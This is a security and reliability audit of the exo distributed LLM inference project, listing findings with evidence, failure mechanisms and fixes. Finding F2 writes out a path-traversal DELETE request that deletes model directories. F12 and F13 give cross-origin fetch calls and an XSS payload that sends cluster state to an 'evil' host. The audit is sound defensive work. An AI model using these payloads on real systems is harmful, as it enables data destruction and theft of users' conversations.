| ID | Severity | Status | Location | Finding | Effort |
| --- | --- | --- | --- | --- | --- |
| F46 | medium | finder-reported | `src/exo/master/main.py:505` | TracesCollected is consumed by the master without being indexed, so the origin never receives an ack and resends the trace payload every ~6 s forever | S |
| F48 | medium | verified | `src/exo/utils/channels.py:317` | MpReceiver.receive_nowait checks the shared closed flag before draining the queue, dropping every item queued behind the peer's close() (confirmed 15/15 in isolation) | S |
| F50 | medium | finder-reported | `src/exo/api/adapters/responses.py:813` | Responses API never reports incomplete/max_output_tokens: finish_reason is discarded | S |
| F59 | medium | verified | `src/exo/worker/main.py:213` | Instance retry cap is a lifetime counter that increments on every node per crash and is never reset on success, so the 5th recoverable crash ever deletes the instance | S |
| F63 | medium | finder-reported | `src/exo/api/main.py:887` | Image dedup caches grow without bound: API never forgets sent hashes and every node's worker keeps every base64 image forever | M |
| F65 | medium | finder-reported | `src/exo/api/adapters/chat_completions.py:151` | Chat Completions accepts response_format, tool_choice, n, logit_bias and silently ignores them | S |
| F68 | medium | finder-reported | `src/exo/shared/models/model_cards.py:179` | ModelCard._autodetect_vision validator performs synchronous filesystem I/O and mutates a frozen model on every validation, making cards environment-dependent | M |
| F74 | medium | finder-reported | `src/exo/worker/main.py:213` | After five failed runner attempts the worker deletes the instance with only a local log line; no failure reason ever reaches cluster state, the dashboard, or /await_instance_ready | M |
| F76 | medium | finder-reported | `src/exo/routing/event_router.py:395` | EventRouter retransmits every un-indexed event every 5 s forever, so unacked TracesCollected leaks and master lag causes retransmit storms | S |
| F75 | medium | finder-reported | `src/exo/api/main.py:1973` | Every generated token is JSON-encoded twice, msgpack-encoded and written to two disk logs, and applied to three State replicas on every node in the cluster | M |
| F71 | medium | finder-reported | `src/exo/worker/main.py:293` | Graceful Shutdown tears the supervisor down right after the ack, so RunnerShutdown and the task's Complete never reach the master and ghost RunnerShuttingDown entries accumulate in state | S |
| F78 | medium | finder-reported | `rust/networking/src/discovery.rs:258` | Interface removed from announce list on HostUnreachable is never re-added, and swap_remove races the netwatcher thread | S |
| F87 | medium | finder-reported | `src/exo/api/main.py:1891` | search_models and fetch_safetensors_size call synchronous huggingface_hub functions on the single node event loop, stalling election/worker/master for the HTTP timeout | S |
| F99 | medium | finder-reported | `rust/networking/src/lib.rs:97` | Discovery loop awaits connect_peer serially, so one unreachable peer stalls discovery and replies for up to open_timeout | S |
| F102 | medium | finder-reported | `src/exo/download/coordinator.py:309` | DownloadCoordinator swallows CancelledError and unconditionally pops active_downloads, so a cancel followed by the planner's automatic restart leaves the new download untracked or stuck | S |
| F103 | medium | finder-reported | `src/exo/utils/info_gatherer/info_gatherer.py:608` | macmon read timeout hangs in Process.aclose() instead of restarting, silently stopping memory telemetry | S |
| F105 | medium | finder-reported | `rust/networking/src/lib.rs:31` | Transport is IPv6-only end to end with no manual join path, and the listener itself requires an IPv6 socket | M |
| F110 | low | finder-reported | `rust/exo_rs/tests/test_python.py:16` | rust/exo_rs/tests/test_python.py calls NetworkingHandle.new with the wrong arity and binds real ports; dummy.rs tests tokio, not exo | S |
| F113 | low | finder-reported | `src/exo/shared/apply.py:333` | apply_node_timed_out never removes node_identities or node_backends, so departed nodes accumulate in State forever | S |
| F122 | low | finder-reported | `src/exo/shared/apply.py:351` | apply_node_gathered_info deep-copies the rustworkx topology (pickle round-trip) for every 1 Hz telemetry event on every replica | S |
| F129 | low | finder-reported | `src/exo/worker/runner/supervisor.py:347` | Cancelled generation tasks never leave the supervisor's in_progress map because the runner emits no terminal status on CancelledResponse | S |
| F130 | low | finder-reported | `src/exo/worker/runner/supervisor.py:88` | All runners append to two shared, never-rotated stdout.log/stderr.log files, so runner logs grow without bound and interleave across runners | S |
| F135 | low | finder-reported | `src/exo/api/main.py:413` | Dashboard polls GET /state every second and the server re-serialises the entire State (with duplicated ModelCards and per-file download maps) with no change detection | S |
| F132 | low | finder-reported | `src/exo/utils/channels.py:350` | Mp channel async helpers create a throw-away CapacityLimiter(1) per call and abandon receiving threads on cancel | S |
| F149 | low | finder-reported | `rust/exo_rs/src/networking.rs:88` | NetworkingHandle.new holds the GIL for the whole zenoh/discovery bootstrap | S |

## Quick wins and strategic changes

### Quick wins — effort S, verified

- **F2** — DELETE /download/{node}/{model_id} with model_id '.' or '..' rmtree's the models directory or its parent (~/.exo) on any node
- **F31** — Release workflow's `uv sync --locked` no longer installs mlx, so the PyInstaller step aborts before any DMG is built
- **F10** — One undecodable message on any topic terminates the whole node: Router._networking_recv re-raises pydantic ValidationError
- **F3** — Non-streaming completions return HTTP 200 with an empty body when inference fails
- **F4** — Claude streaming swallows ErrorChunk and emits a clean message_stop with stop_reason null
- **F16** — Responses streaming swallows ErrorChunk and emits response.completed with status "completed"
- **F5** — EXO_ZENOH_NAMESPACE is logged but never applied; README documents the env var that crashes startup; macOS app namespace setting is silently ignored
- **F6** — Cancel button is a no-op for Regenerate / Edit-and-regenerate / regenerate-from-token: those fetches never register an AbortController
- **F7** — test_resilience.py passes 60 as expected_nodes, so the only node-recovery test can never pass
- **F8** — is_model_downloaded() uses all() so it is True for an empty list and False whenever any other model is present
- **F9** — exo.shared.constants resolves the dashboard build at import time, so `uv run pytest` fails collection on any checkout without `npm run build`
- **F11** — Stop-sequence-terminated requests stay in the mlx BatchGenerator as zombie rows until EOS/max_tokens
- **F17** — Global backslash strip runs after code blocks are restored, corrupting `\n`, `\t`, regex escapes and Windows paths in every code snippet and its Copy button
- **F18** — download_shard swallows file-list fetch failures (incl. HF 401/403) so the download silently no-ops and never becomes DownloadFailed
- **F28** — DownloadCoordinator command loop has no error boundary; any unexpected exception crashes the whole exo process
- **F33** — API asserts ChunkGenerated for image commands is an ImageChunk, so the supervisor's crash ErrorChunk (and any image-engine ErrorChunk) crashes the whole node
- **F34** — API.reset drops the generation-queue dicts without closing the senders, so every request in flight during a master change hangs forever behind SSE keep-alives
- **F42** — warmup_inference clamps elapsed time with min() instead of max(), so the cancel-check interval is always 100 tokens
- **F45** — "Ensure tag commit is on main" guard tests the inverse relation (main is ancestor of tag) and passes tags on side branches
- **F113** — apply_node_timed_out never removes node_identities or node_backends, so departed nodes accumulate in State forever
- **F115** — Streaming chat chunks are tagged object="chat.completion" instead of "chat.completion.chunk"

### Strategic — each retires a theme

- **State snapshots and master handover** (F24, F26, F96). Removes the whole "epoch" theme: late-joiner replay storms, the 30–40 s blind window, and the total outage on master loss. A `StateSnapshot` event that replaces `State` and sets the index is the minimal version; a successor master that adopts the predecessor's log is the full one.
- **Chunked, interleaved prefill** (F15, F35, F23). Admit new requests by prefilling in bounded chunks between decode steps instead of synchronously inside `submit`. Removes the head-of-line stall on every in-flight stream and most of the "no deadline" wedges.
- **A real error type on the wire** (F3, F4, F16, F64, F136). Give every adapter an explicit error event (Anthropic `error`, Responses `response.failed`, OpenAI error envelope on 5xx) and route `ErrorChunk` to it. Removes the entire first theme at once.
- **Bind local, authenticate, sanitise** (F12, F13, F2, F25). Loopback default, optional bearer token, no CORS, DOMPurify on the dashboard, and `ModelId` validation. Together these close the LAN and browser attack surfaces; transport auth on zenoh is the remaining piece.
- **Run the tests that exist, where they can run** (F19, F9, F20, F7, F8, F29). pytest on Linux in CI, lazy dashboard resolution, tests isolated from `$HOME`, the harness bugs fixed, and the TP bit-exactness test replaced with a tolerance. Most of the pipeline theme is small individual fixes; the value is in doing all of them.

### Sequencing

F12 (bind local, no CORS) before F13 (sanitise): the first contains the second's blast radius. F9 (lazy
dashboard path) before F19 (pytest on Linux), or the Linux job cannot collect. F35 (bounded ack) and F15
(chunked prefill) touch the same loop; do F35 first as the safety net, then F15. The snapshot work (F24, F26)
should land as one change — a snapshot without handover still wipes instances, and handover without a
snapshot still replays history.

## Finding reference

Every finding, by id. `Evidence` is what was read in the tree, `Mechanism` is how it fails in operation, and
`Fix` is the proposed change.

### F1 — Placement enumerates every simple cycle of the topology (exponential) and the previews endpoint runs it 4N times synchronously on the node's only event loop

*`src/exo/shared/topology.py:203` — critical · effort M · verified · lens `performance` · confidence 0.92*

**Evidence.** topology.py:200-210 `get_cycles` does `cycle_idxs = rx.simple_cycles(self._graph)` over the whole multigraph and wraps each in a `Cycle`. placement.py:117-118 `cycles = topology.get_cycles()` then filters. api/main.py:527-558 builds `instance_combinations` for `(Pipeline,Tensor) x (MlxRing,MlxJaccl) x range(1, N+1)` and calls the synchronous `get_instance_placements(...)` for each inside `async def get_placement_previews`; also `list(self.state.topology.list_nodes())` at 518 and 534. The dashboard polls this endpoint every 15 s while a model is selected (app.svelte.ts:1414-1418) and again on every topology change (1493-1496). Measured in this repo's venv: 8 fully-meshed nodes -&gt; 16,064 cycles / 14 ms; 10 nodes -&gt; 1,112,073 cycles, 2.2 s raw `rx.simple_cycles`, 4.4 s through `Topology.get_cycles()`. Router `_networking_recv` (router.py:237-251), Master, Election and Worker all run on this same loop (main.py Node), and the Rust side buffers inbound messages in an mpsc(1024) whose subscriber callback uses `try_send` (swarm.rs:56, 174-177) and drops on overflow.

**Mechanism.** With &gt;=10 LAN-meshed nodes (every pair has an edge in both directions), opening the model picker issues 40 placement calls x ~4 s = ~3 minutes of pure CPU on the event loop, repeated every 15 s. During that time no SSE token is written, no election/command/event message is processed, and after ~1024 inbound zenoh messages further ones (including COMMANDS, which have no retry) are silently dropped, so other nodes' chat requests hang. The master's own `PlaceInstance` handling (master/main.py:372-381) has the same cost. At 12 nodes the count is &gt;10^8 and the node is effectively wedged; memory also balloons because every cycle becomes a Python `Cycle` object.

**Fix.** 1) Compute cycles once per `get_placement_previews` call (or memoize on a topology version/snapshot hash) and pass them into `place_instance` instead of re-enumerating for each of the 4N combinations. 2) Replace `rx.simple_cycles` with a length-bounded search: since `get_smallest_cycles` only ever keeps the minimum length, enumerate cycles by increasing length k (DFS from the highest-memory node, depth-capped) and stop at the first k for which a memory/backend-feasible cycle exists; cap the total candidates. 3) Run placement off the event loop (`await anyio.to_thread.run_sync(...)`) so a slow placement cannot stall token streaming, election or the Router.

### F2 — DELETE /download/{node}/{model_id} with model_id '.' or '..' rmtree's the models directory or its parent (~/.exo) on any node

*`src/exo/download/download_utils.py:249` — critical · effort S · verified · lens `security` · confidence 0.90*

**Evidence.** `ModelId.normalize()` only does `self.replace("/", "--")` (src/exo/shared/types/common.py:33-34), so `ModelId("..")` and `ModelId(".")` normalize to themselves. `delete_model` (download_utils.py:242-256) then does `model_dir = models_dir / normalized; if await aios.path.exists(model_dir): await asyncio.to_thread(shutil.rmtree, model_dir, ignore_errors=False)` for every writable dir in `EXO_MODELS_DIRS`, plus `EXO_DEFAULT_MODELS_DIR / "caches" / normalized`. The API route `self.app.delete("/download/{node_id}/{model_id:path}")` (src/exo/api/main.py:392, handler 2064-2071) forwards `DeleteDownload(target_node_id=node_id, model_id=ModelId(model_id))` with no validation; the coordinator's `_delete_download` (coordinator.py:319-334) only checks the read-only flag for ids already in `download_status`, then calls `delete_model`. I verified with an ASGI-level test that `/download/n1/..`, `/download/n1/.` and `/download/n1/%2e%2e` all reach the handler with model_id `..`/`.`; hypercorn only `unquote`s the path (hypercorn/protocol/http_stream.py:86-93) and Starlette does no dot-segment normalization.

**Mechanism.** Any host on the LAN (or any web page the operator visits, given the `*` CORS policy) sends `DELETE http://<node>:52415/download/<target_node_id>/..`. On macOS `EXO_DEFAULT_MODELS_DIR` is `~/.exo/models`, so `models_dir / ".."` is `~/.exo`; rmtree removes every entry under it (all models, event logs, custom cards, node_zid identity, pid file) before the final rmdir fails. With `.` the entire models directory is emptied. With `EXO_MODELS_DIRS=/Volumes/External/models`, `..` empties `/Volumes/External`. Node ids are public via GET /state. Same command is also injectable directly on the `download_commands` zenoh topic.

**Fix.** Validate `ModelId` at construction (pydantic after-validator in `ModelId.__get_pydantic_core_schema__`): require `^[A-Za-z0-9][A-Za-z0-9._-]*(/[A-Za-z0-9][A-Za-z0-9._-]*)?$` and reject any path segment equal to `.` or `..`. Additionally harden `delete_model`/`resolve_model_dir`: compute `model_dir = (models_dir / normalized).resolve()` and refuse unless `model_dir.parent == models_dir.resolve()` and `normalized not in (".", "..")`. Add a test that `DELETE /download/x/..` returns 4xx and touches nothing.

### F3 — Non-streaming completions return HTTP 200 with an empty body when inference fails

*`src/exo/api/main.py:942` — high · effort M · verified · lens `api-compat` · confidence 0.95*

**Evidence.** All non-streaming text routes wrap a collector generator in a StreamingResponse: main.py:942-948 `return StreamingResponse(collect_chat_response(...), media_type="application/json")`, same at 1561-1568 (claude), 1598-1605 (responses), 1639-1645 and 1675-1681 (ollama). Each collector raises on error: chat_completions.py:355-356 `if error_message is not None: raise ValueError(error_message)`; claude.py:309-310; responses.py:444-445; ollama.py:291 and 463. They also `assert model is not None` (chat_completions.py:360, ollama.py:313, ollama.py:480). Starlette 0.50 `StreamingResponse.stream_response` (responses.py:245-253) sends `http.response.start` with status 200 before iterating the body. Reproduced with TestClient(raise_server_exceptions=False): a generator that raises before yielding produced `status: 200 body: b''`.

**Mechanism.** Runner emits an ErrorChunk (OOM, Metal timeout, malformed tool JSON), or the channel is closed with no chunks (instance deleted via _close_streams_for_instance at main.py:1998-2010, or /v1/cancel). The client gets a 200 status line and then a truncated/empty body; OpenAI/Anthropic/Ollama SDKs raise a JSON decode error instead of surfacing the server's message, and retry logic keyed on 5xx never fires. The existing OpenAI error envelope (http_exception_handler, main.py:322-332) is unreachable on this path.

**Fix.** Materialize the collectors before building the response: make collect_chat_response/collect_claude_response/collect_responses_response/collect_ollama_* return a pydantic model (await them in the route, catching anyio cancellation in _token_chunk_stream as today), then `return JSONResponse(model.model_dump(exclude_none=True))`. On ErrorChunk raise HTTPException(500, detail=error_message) so the envelope handler fires; on a closed channel with no chunks raise HTTPException(503, "generation aborted: instance no longer available") instead of asserting.

### F4 — Claude streaming swallows ErrorChunk and emits a clean message_stop with stop_reason null

*`src/exo/api/adapters/claude.py:378` — high · effort S · verified · lens `api-compat` · confidence 0.95*

**Evidence.** claude.py:378-380: `if isinstance(chunk, ErrorChunk):\n    # Close text block and bail\n    break`. The code then falls through to claude.py:473-490 which emits an empty text block, `message_delta` with `ClaudeMessageDelta(stop_reason=stop_reason)` (still None) and `message_stop`. No `error` event type exists in claude_api.py (ClaudeStreamEvent union at 234-241 has no error member). The Anthropic error envelope is `{"type":"error","error":{"type":"api_error","message":...}}` (claude-api skill shared/error-codes.md:34).

**Mechanism.** When a runner fails mid-generation, a Claude Code / Anthropic SDK client receives a syntactically complete message: content_block_start/stop for an empty text block, `message_delta` with `stop_reason: null`, `message_stop`. The SDK's `get_final_message()` returns an empty assistant turn with no exception; agent loops treat it as a finished turn, append an empty assistant message to history, and continue. The actual error text is discarded (chunk.error_message is never read in this function).

**Fix.** Add `ClaudeErrorEvent(type="error", error={"type": "api_error", "message": str})` to claude_api.py and in generate_claude_stream replace the `break` with: close any open content block, yield `event: error\ndata: {...}\n\n`, and `return`. Do not emit message_delta/message_stop after an error.

### F5 — EXO_ZENOH_NAMESPACE is logged but never applied; README documents the env var that crashes startup; macOS app namespace setting is silently ignored

*`src/exo/main.py:347` — high · effort S · verified · lens `dead-code-drift` · confidence 0.95*

**Evidence.** src/exo/main.py:343-347: `if os.getenv("EXO_LIBP2P_NAMESPACE"): raise ValueError("EXO_LIBP2P_NAMESPACE has been removed - use EXO_ZENOH_NAMESPACE instead")` then `logger.info(f"EXO_ZENOH_NAMESPACE: {os.getenv('EXO_ZENOH_NAMESPACE')}")` — that is the only read of EXO_ZENOH_NAMESPACE in src/ or rust/ (grep). The namespace actually handed to the transport is `args.namespace` (main.py:58 `Router.create(node_id, namespace=args.namespace, ...)`), whose argparse default is `__version__` (main.py:467-473) with no env fallback. The macOS app sets `environment["EXO_ZENOH_NAMESPACE"] = computeNamespace()` (app/EXO/EXO/ExoProcessController.swift:355, 431-435) from the SettingsView "Cluster Namespace" field (SettingsView.swift:70-75 'Nodes with the same namespace form a cluster'). README.md:249-258, 322, 342 tell source users to set `EXO_LIBP2P_NAMESPACE=my-dev-cluster uv run exo`. docs/architecture.md:116 claims the app 'exposes a setting named EXO_LIBP2P_NAMESPACE' (it does not).

**Mechanism.** A macOS-app user who sets a custom Cluster Namespace to isolate a dev cluster gets no isolation: the daemon still hashes `__version__` into the discovery Hello (rust/networking/src/lib.rs:61-65) and joins every same-version node on the LAN. A source user who follows README and exports EXO_LIBP2P_NAMESPACE gets a ValueError after the PID file is written and logging is set up; under --legacy-daemon stderr is /dev/null so the process just vanishes. The error message then tells them to use a variable that does nothing.

**Fix.** In `Args.parse` make `--namespace` default to `os.getenv("EXO_ZENOH_NAMESPACE", __version__)` (and pass a non-empty value only), delete the EXO_LIBP2P_NAMESPACE raise, and replace every README/docs mention of EXO_LIBP2P_NAMESPACE with EXO_ZENOH_NAMESPACE (README env table row + 'Custom Namespace' section). Add a test that `Args.parse()` with EXO_ZENOH_NAMESPACE set yields `args.namespace == value`.

### F6 — Cancel button is a no-op for Regenerate / Edit-and-regenerate / regenerate-from-token: those fetches never register an AbortController

*`dashboard/src/lib/stores/app.svelte.ts:1942` — high · effort S · verified · lens `dashboard` · confidence 0.95*

**Evidence.** `sendMessage` creates `const abortController = new AbortController(); this.currentAbortController = abortController;` (2512-2513) and passes `signal: abortController.signal` (2531). `regenerateChatCompletion` fetches at 1942-1953 with no `signal` and never touches `currentAbortController`; same for `regenerateFromToken` at 1719-1730. `stopGeneration()` (2728-2729) is `this.currentAbortController?.abort()`. ChatForm.svelte:484-501 shows the Cancel button whenever `loading` and calls `stopGeneration()`. `regenerateLastResponse`/`editAndRegenerate` (1567-1620) route into `regenerateChatCompletion`.

**Mechanism.** User clicks Regenerate (or edits a prompt and presses Enter), then clicks Cancel: nothing happens — the stream keeps flowing, `isLoading` stays true so the input is locked, and the cluster keeps burning GPU until the model emits EOS or hits max tokens. On a 30B model at low TPS this can be minutes of an unresponsive chat.

**Fix.** Create and store an AbortController in `regenerateChatCompletion` and `regenerateFromToken` exactly as `sendMessage` does, pass `signal`, and handle `AbortError` in their catch blocks. Better: extract a single `streamChatCompletion(body, targetConversationId, messageId)` used by all three paths so abort/error/persist logic exists once.

### F7 — test_resilience.py passes 60 as expected_nodes, so the only node-recovery test can never pass

*`tests/test_resilience.py:36` — high · effort S · verified · lens `test-gaps` · confidence 0.95*

**Evidence.** tests/test_resilience.py:36 and :50 call `session.wait_ready(60)`. The signature in tests/framework.py:176-178 is `def wait_ready(self, expected_nodes: int | None = None, timeout: float = 60)`, so 60 is bound to `expected_nodes`. framework.py:185-198 then loops until `identities == expected_nodes and memory == expected_nodes` and raises `TimeoutError("Cluster did not reach exactly 60 ready nodes")`. The file is `# type: ignore` (line 1) and both parameters are numeric, so basedpyright cannot catch it.

**Mechanism.** Phase 2 of test_node_recovery (disconnect one node of a 2-node cluster) always raises TimeoutError after 60 s; phases 3-5 (1-node inference, reconnect, 2-node re-placement) never execute. The one integration test that exercises master death / node disconnect / rejoin is permanently red, and because `addopts` in pyproject.toml has `--ignore=tests` and CI never runs `tests/`, nobody sees it fail.

**Fix.** Change both calls to `session.wait_ready(timeout=60)` (or `wait_ready(expected_nodes=1, timeout=60)` / `(2, 60)` explicitly). In framework.py make `timeout` keyword-only (`def wait_ready(self, expected_nodes=None, *, timeout=60.0)`) so positional misuse is a TypeError. Drop the `# type: ignore` header from tests/*.py so basedpyright covers the harness.

### F8 — is_model_downloaded() uses all() so it is True for an empty list and False whenever any other model is present

*`tools/src/exo_tools/harness.py:643` — high · effort S · verified · lens `test-gaps` · confidence 0.95*

**Evidence.** harness.py:640-643: `response = client.request_json("GET", "/models", params={"status": "downloaded"}); data = ...; return all(model.get("id") == model_id for model in data)`. src/exo/api/main.py:1789-1796 shows `?status=downloaded` returns every card whose model_id appears in any node's DownloadCompleted list. `all([])` is True; `all(...)` is False as soon as a second downloaded model exists.

**Mechanism.** tests/test_1node.py:63-70 polls `if not is_model_downloaded(...): break` after deleting the model. On a cluster with no downloads the helper says 'downloaded', the loop never breaks and the test fails with 'Expected ... to be deleted from cluster' after 60 s. On a cluster that also holds any other model the helper says 'not downloaded' immediately even though the target model is still on disk, so `test_download_from_scratch` proceeds without a fresh download and silently stops testing the download path.

**Fix.** Replace `all(...)` with `any(model.get("id") == model_id for model in data)`. Add a pure unit test for the helper in tools (e.g. tools/tests/test_harness.py) covering empty list, target-only, other-only and mixed lists using a stub ExoClient; this needs no cluster.

### F9 — exo.shared.constants resolves the dashboard build at import time, so `uv run pytest` fails collection on any checkout without `npm run build`

*`src/exo/shared/constants.py:65` — high · effort S · verified · lens `test-gaps` · confidence 0.95*

**Evidence.** constants.py:63-66: `_DASHBOARD_DIR_ENV = os.environ.get("EXO_DASHBOARD_DIR", None); DASHBOARD_DIR = (find_dashboard() if _DASHBOARD_DIR_ENV is None else ...)`. dashboard_path.py:34-40 raises `FileNotFoundError("Unable to locate dashboard assets - you probably forgot to run `cd dashboard &amp;&amp; npm install &amp;&amp; npm run build`")`. Verified: `pytest src --collect-only` on this checkout gives `61 tests collected, 29 errors in 5.85s`, every error being that FileNotFoundError (e.g. master/tests/test_master.py, worker/tests/unittests). CI only works because pipeline.yml:112 exports `EXO_DASHBOARD_DIR="$PWD/dashboard/"`.

**Mechanism.** The documented pre-commit check `uv run basedpyright && uv run ruff check && nix fmt && uv run pytest` (CLAUDE.md) aborts with 29 collection errors for anyone who has not built the Svelte frontend, and a developer running a single backend test file (e.g. `pytest src/exo/master/tests/test_master.py`) gets a message about npm. Pure-Python subsystems (master, apply, election, download) are gated on a Node.js toolchain. The workaround env var also silently accepts a nonexistent directory, so a mis-set EXO_DASHBOARD_DIR yields a green test run against a missing dashboard.

**Fix.** Make dashboard resolution lazy: keep `find_dashboard()` in dashboard_path.py but call it from `API.__init__`/`run()` (src/exo/api/main.py) instead of at constants import; or wrap `DASHBOARD_DIR` in a function `get_dashboard_dir()`. Until then, add a repo-root `conftest.py` (or `src/conftest.py`) that sets `os.environ.setdefault("EXO_DASHBOARD_DIR", str(tmp))` before `exo.shared.constants` is imported, and add a test asserting that importing `exo.shared.constants` with no dashboard does not raise.

### F10 — One undecodable message on any topic terminates the whole node: Router._networking_recv re-raises pydantic ValidationError

*`src/exo/routing/router.py:200` — high · effort S · verified · lens `control-plane` · confidence 0.90*

**Evidence.** router.py:186-219: `case FromSwarm.Message(topic, data): ... await router.publish_bytes(data)` runs inside `try: ... except Exception as exception: logger.opt(exception=exception).error("Gossipsub receive loop terminated unexpectedly"); raise`. `publish_bytes` (line 86-87) calls `self.topic.deserialize(data)` = `model_validate_json` (topics.py:36-37), which raises `pydantic.ValidationError` (an `Exception`) for any payload that does not match the strict `extra="forbid"` schema. The re-raise escapes the Router's TaskGroup, then Node's `_tg` (main.py:156-170), and `main_inner` (main.py:369-374) logs "EXO terminated due to unhandled exception" and re-raises. The only guarded case is an unknown topic name (line 194-198).

**Mechanism.** Any process that can publish on the zenoh mesh for this namespace sends one payload that fails validation (a peer running a different exo build with `--namespace` overridden so it connects anyway, an older node receiving a new `Event`/`Command` TaggedModel variant it does not know, or any stray publisher on the LAN) -&gt; every node that receives it exits. Because the same message reaches all nodes, this takes down the entire cluster at once, and a version-skewed peer that keeps publishing makes restarts crash-loop.

**Fix.** In `_networking_recv`, wrap only `router.publish_bytes(data)` in `try/except (pydantic.ValidationError, UnicodeDecodeError)`: log at warning with the topic and a truncated payload, then `continue`. Keep the outer re-raise for failures of `self._net.recv()` itself. Add a unit test that registers a topic, feeds `b"{}"` and `b"\xff"` through `publish_bytes`, and asserts the loop survives and later valid messages are still delivered.

### F11 — Stop-sequence-terminated requests stay in the mlx BatchGenerator as zombie rows until EOS/max_tokens

*`src/exo/worker/engines/mlx/generator/batch_generate.py:464` — high · effort S · verified · lens `mlx-engine` · confidence 0.90*

**Evidence.** batch_generate.py:381-395 sets `finish_reason = "stop"` when a user stop string matches; 464-465 then does `if is_done: del self._active_tasks[response.uid]` and nothing else. The only path that removes a row from mlx_lm is `cancel()` (484-487, `self._mlx_gen.remove(uids)`), which is only invoked from the runner's `_apply_cancellations` (runner/llm_inference/batch_generator.py:485-486) for cancelled tasks. The runner also just does `del self._active_tasks[uid]` on a terminal response (456-459). mlx_lm's `GenerationBatch.next()` (pinned generate.py:1437-1497) only drops rows whose own `finish_reason` is set (EOS or length), so an exo-level stop match leaves the row in the batch. `has_work` (112-119) stays true via `len(self._mlx_gen._generation_batch) > 0`, and every later response for that uid hits the `logger.warning("response uid ... was not found")` branch at 347-351.

**Mechanism.** Any request that ends via `stop` (very common for code completion, structured output, agent frameworks) keeps consuming a decode slot and GPU time for up to `MAX_TOKENS = 32168` more tokens (constants.py:7) or until the model happens to emit EOS. Concurrent users see per-step latency grow with the zombie rows, `completion_batch_size` slots fill with dead sequences, the runner keeps stepping with no active tasks, and the log fills with one warning per zombie per step. On multi-rank instances every rank does the same, so it wastes the whole cluster.

**Fix.** In `ExoBatchGenerator.step`, when `is_done` was produced by the exo stop-sequence check (i.e. `response.finish_reason is None` but `finish_reason == "stop"`), collect the uid and call `self._mlx_gen.remove(stopped_uids)` after the response loop (rows that finished by EOS/length are already filtered by mlx_lm). Add a unit test for `ExoBatchGenerator.step` with a stub `_mlx_gen` (there are currently no tests for this class; `tests/test_batch_generate.py` only exercises `_merge_caches`) asserting `remove` is called and `has_work` becomes False after a stop match.

### F12 — API binds 0.0.0.0 with no authentication and CORS allow_origins=['*'] + allow_credentials=True, so any web page can drive the cluster and read the full prompt/response event log

*`src/exo/api/main.py:337` — high · effort M · verified · lens `security` · confidence 0.90*

**Evidence.** `_setup_cors` (main.py:334-340): `allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"]`. `run_api` (main.py:1942): `cfg.bind = [f"0.0.0.0:{self.port}"]`, with no `--host` option in `Args` (src/exo/main.py:380-500). There is no auth middleware anywhere in `_setup_routes` (main.py:342-409). `stream_events` (main.py:1013-1027) returns `self._event_log.read_all()` — every event the node has seen, including `TaskCreated` (prompts) and `ChunkGenerated` (tokens). Ollama routes read the raw body regardless of Content-Type (`body = await request.body()`, main.py:1615, 1651, 1718), so they are reachable by a simple form POST without preflight. Starlette echoes the requesting Origin with `Access-Control-Allow-Credentials: true` when `*`+credentials is configured (starlette/middleware/cors.py:36, 47, 159).

**Mechanism.** A visited malicious page does `fetch('http://localhost:52415/events')` and reads the operator's entire chat history; `fetch('/v1/chat/completions', {method:'POST'})` to run inference; `DELETE /instance/<id>`, `POST /download/start` (fill disk), `POST /v1/traces/delete`, `POST /models/add`. The same surface is open to every host on the LAN/Wi-Fi because of the 0.0.0.0 bind. README documents the API as `http://localhost:52415` only, so operators reasonably assume it is local-only.

**Fix.** 1) Default `cfg.bind` to `127.0.0.1` and add `--api-host` / `EXO_API_HOST` for opt-in LAN exposure; the worker's `net_profile` probe of `/node_id` can use a separate bind or a dedicated lightweight listener. 2) Remove `CORSMiddleware` entirely (the dashboard is served same-origin from `/`) or restrict `allow_origins` to an explicit list and drop `allow_credentials`. 3) Add an optional bearer token (`EXO_API_KEY`) enforced by middleware on every route except `/node_id`. 4) Make the Ollama handlers require `application/json` Content-Type. 5) Gate or remove `GET /events` (see the event-log finding).

### F13 — Dashboard renders model output via {@html} with no sanitizer; raw HTML and LaTeX-placeholder paths give model responses script execution in the control-plane origin

*`dashboard/src/lib/components/MarkdownContent.svelte:537` — high · effort S · verified · lens `security` · confidence 0.90*

**Evidence.** `processMarkdown` calls `marked.parse(preprocessed)` (line 417) and the result is inserted with `{@html processedHtml}` (line 537). `marked` (^17, package.json:34) passes raw HTML tokens through unchanged and there is no DOMPurify/sanitizer dependency anywhere in `dashboard/src` (grep for `DOMPurify|sanitize` returns nothing). Independently of marked, `preprocessLaTeX` stores raw user content in `htmlSnippets` and re-injects it after markdown: `<div class="latex-proof-content">${content}</div>` (212), `<div class="latex-theorem-content">${content}</div>` (237), `<em>${content}</em>` (248, 254), and the math error path `${display}` (394). The `unescapeHtmlEntities` helper (58-65) is dead code.

**Mechanism.** A model reply (or a tool result / pasted web content the model echoes, i.e. prompt injection) containing `<img src=x onerror="fetch('/state').then(r=>r.text()).then(t=>fetch('https://evil/'+btoa(t)))">` or `\textbf{<script>...</script>}` executes in the dashboard origin. That origin can call every unauthenticated control endpoint (delete instances, delete downloads, start downloads, read /events with all past prompts) and exfiltrate them.

**Fix.** Add `dompurify` and run `DOMPurify.sanitize(html, {ADD_ATTR:['data-code','data-math-source','data-code-id'], FORBID_TAGS:['style','script','iframe','object','embed'], ALLOW_UNKNOWN_PROTOCOLS:false})` on the final string before assigning `processedHtml`; KaTeX output uses only spans/classes/inline style and survives the default profile with `style` allowed on `span`. Escape `content` in every `htmlSnippets.set(...)` and in the math-error fallback with a small `escapeHtml()`. Delete `unescapeHtmlEntities`. Add a unit test that `<img onerror>` in `content` yields no `onerror` attribute in the container.

### F14 — Bug reporter uploads the complete conversation history (prompts, completions, uploaded images) plus hardware UUID, MAC, Wi-Fi SSID and username, disclosed only as 'Diagnostic logs'

*`app/EXO/EXO/Services/BugReportService.swift:173` — high · effort M · verified · lens `security` · confidence 0.90*

